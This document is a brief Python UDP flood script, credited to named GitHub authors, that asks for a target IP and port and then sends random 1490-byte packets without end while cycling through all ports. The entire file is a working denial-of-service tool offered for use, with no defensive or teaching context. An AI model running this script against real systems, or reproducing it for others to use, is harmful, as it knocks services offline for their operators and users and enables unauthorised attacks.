import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
print ("Author   : HA-MRX")
print("Converted to Windows and Python3 by UltraHackerDog")
print ("Author Github   : https://github.com/Ha3MrX")
print ("Editor Github   : https://github.com/UltraHackerDog")
print("-"*50)
ip = input("IP Target : ")
port = input("Port       : ")
port = int(port)

os.system("cls")
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

